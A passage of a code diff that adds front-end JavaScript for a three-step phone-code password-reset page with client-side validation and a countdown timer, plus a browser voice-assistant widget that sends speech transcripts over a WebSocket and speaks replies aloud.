+      if (phone.length < 10) { showError('error1', 'Please enter a valid phone number'); return; }
+      document.getElementById('maskedPhone').textContent = '*** *** ' + phone.slice(-4);
+      hideError('error1');
+      goToStep(2);
+      startTimer();
+      document.querySelector('.code-input').focus();
+    });
+
+    // Code inputs
+    const codeInputs = document.querySelectorAll('.code-input');
+    codeInputs.forEach((input, i) => {
+      input.addEventListener('input', (e) => {
+        e.target.value = e.target.value.replace(/\D/g, '');
+        if (e.target.value && i < codeInputs.length - 1) codeInputs[i + 1].focus();
+      });
+      input.addEventListener('keydown', (e) => {
+        if (e.key === 'Backspace' && !e.target.value && i > 0) codeInputs[i - 1].focus();
+      });
+    });
+
+    // Step 2
+    document.getElementById('form2').addEventListener('submit', (e) => {
+      e.preventDefault();
+      const code = Array.from(codeInputs).map(i => i.value).join('');
+      if (code.length < 6) { showError('error2', 'Please enter the complete 6-digit code'); return; }
+      hideError('error2');
+      clearInterval(timerInterval);
+      goToStep(3);
+    });
+
+    let timerInterval;
+    function startTimer() {
+      let sec = 600;
+      clearInterval(timerInterval);
+      timerInterval = setInterval(() => {
+        sec--;
+        const m = Math.floor(sec / 60), s = sec % 60;
+        document.getElementById('timer').textContent = `${m}:${s.toString().padStart(2, '0')}`;
+        if (sec <= 0) clearInterval(timerInterval);
+      }, 1000);
+    }
+    function resendCode() { startTimer(); alert('A new code has been sent.'); }
+
+    // Password
+    const pwd = document.getElementById('newPassword');
+    pwd.addEventListener('input', () => {
+      const v = pwd.value;
+      updateReq('req-length', v.length >= 16);
+      updateReq('req-upper', /[A-Z]/.test(v));
+      updateReq('req-lower', /[a-z]/.test(v));
+      updateReq('req-number', /\d/.test(v));
+    });
+
+    function updateReq(id, met) {
+      const el = document.getElementById(id);
+      el.classList.toggle('met', met);
+      el.querySelector('svg').innerHTML = met ? '<path d="M20 6L9 17l-5-5" fill="none" stroke="currentColor" stroke-width="2"/>' : '<circle cx="12" cy="12" r="5" fill="currentColor"/>';
+    }
+
+    // Step 3
+    document.getElementById('form3').addEventListener('submit', (e) => {
+      e.preventDefault();
+      const p = document.getElementById('newPassword').value;
+      const c = document.getElementById('confirmPassword').value;
+      if (p.length < 16 || !/[A-Z]/.test(p) || !/[a-z]/.test(p) || !/\d/.test(p)) { showError('error3', 'Password does not meet requirements'); return; }
+      if (p !== c) { showError('error3', 'Passwords do not match'); return; }
+      hideError('error3');
+      document.getElementById('step3').classList.add('hidden');
+      document.getElementById('step-success').classList.remove('hidden');
+    });
+
+    function togglePassword(id) {
+      const inp = document.getElementById(id);
+      inp.type = inp.type === 'password' ? 'text' : 'password';
+    }
+
+    function goToStep(n) {
+      document.getElementById('step1').classList.add('hidden');
+      document.getElementById('step2').classList.add('hidden');
+      document.getElementById('step3').classList.add('hidden');
+      document.getElementById('step-success').classList.add('hidden');
+      document.getElementById(`step${n}`).classList.remove('hidden');
+    }
+
+    function showError(id, msg) {
+      const el = document.getElementById(id);
+      el.querySelector('span').textContent = msg;
+      el.classList.add('show');
+    }
+    function hideError(id) { document.getElementById(id).classList.remove('show'); }
+
+    // ========================================
+    // VOICE ASSISTANT
+    // ========================================
+    let recognition = null;
+    let isListening = false;
+
+    function initVoice() {
+      if (!('webkitSpeechRecognition' in window) && !('SpeechRecognition' in window)) {
+        document.getElementById('voiceTranscript').textContent = 'Voice not supported in this browser';
+        return;
+      }
+
+      const SpeechRecognition = window.SpeechRecognition || window.webkitSpeechRecognition;
+      recognition = new SpeechRecognition();
+      recognition.continuous = false;
+      recognition.interimResults = true;
+      recognition.lang = 'en-US';
+
+      recognition.onstart = () => {
+        isListening = true;
+        document.getElementById('micBtn').classList.add('listening');
+        document.getElementById('voiceStatus').textContent = 'Listening...';
+        document.getElementById('voiceStatus').className = 'voice-status listening';
+        document.getElementById('voiceTranscript').textContent = '';
+      };
+
+      recognition.onresult = (event) => {
+        let transcript = '';
+        for (let i = event.resultIndex; i < event.results.length; i++) {
+          transcript += event.results[i][0].transcript;
+        }
+        document.getElementById('voiceTranscript').textContent = transcript;
+
+        if (event.results[event.results.length - 1].isFinal) {
+          sendVoiceMessage(transcript);
+        }
+      };
+
+      recognition.onerror = (event) => {
+        console.error('Speech error:', event.error);
+        stopListening();
+        if (event.error === 'not-allowed') {
+          document.getElementById('voiceTranscript').textContent = 'Please allow microphone access';
+        }
+      };
+
+      recognition.onend = () => {
+        stopListening();
+      };
+
+      // Load voices for TTS
+      if ('speechSynthesis' in window) {
+        speechSynthesis.getVoices();
+      }
+    }
+
+    function toggleMic() {
+      if (!recognition) return;
+      if (isListening) {
+        recognition.stop();
+      } else {
+        recognition.start();
+      }
+    }
+
+    function stopListening() {
+      isListening = false;
+      document.getElementById('micBtn').classList.remove('listening');
+      document.getElementById('voiceStatus').textContent = 'AI Assistant Ready';
+      document.getElementById('voiceStatus').className = 'voice-status';
+    }
+
+    function sendVoiceMessage(text) {
+      if (ws && ws.readyState === WebSocket.OPEN) {
+        document.getElementById('voiceStatus').textContent = 'AI is thinking...';
+        ws.send(JSON.stringify({ type: 'voice-message', text: text }));
+      }
+    }
+
+    function speakResponse(text) {
+      document.getElementById('voiceTranscript').textContent = text;
+      document.getElementById('voiceStatus').textContent = 'Speaking...';
+      document.getElementById('voiceStatus').className = 'voice-status speaking';
+
+      if ('speechSynthesis' in window) {
+        speechSynthesis.cancel();
+        const utterance = new SpeechSynthesisUtterance(text);
+        utterance.rate = 1.0;  // Normal speed (0.5=slow, 1=normal, 1.5=fast)
+        utterance.pitch = 1;
+        utterance.volume = 1;
+        utterance.lang = 'en-CA'; // Canadian English
+
+        // Try to find a Canadian or natural English voice
+        const voices = speechSynthesis.getVoices();
+        const preferredVoice = voices.find(v =>
+          v.lang === 'en-CA' || v.name.includes('Canadian')
+        ) || voices.find(v =>
+          v.name.includes('Google') || v.name.includes('Natural') || v.name.includes('Microsoft David')
+        );
+        if (preferredVoice) utterance.voice = preferredVoice;
+
+        utterance.onend = () => {
+          document.getElementById('voiceStatus').textContent = 'AI Assistant Ready';
+          document.getElementById('voiceStatus').className = 'voice-status';
+        };
+
+        speechSynthesis.speak(utterance);
+      }
+    }
+  </script>
+</body>
+</html>
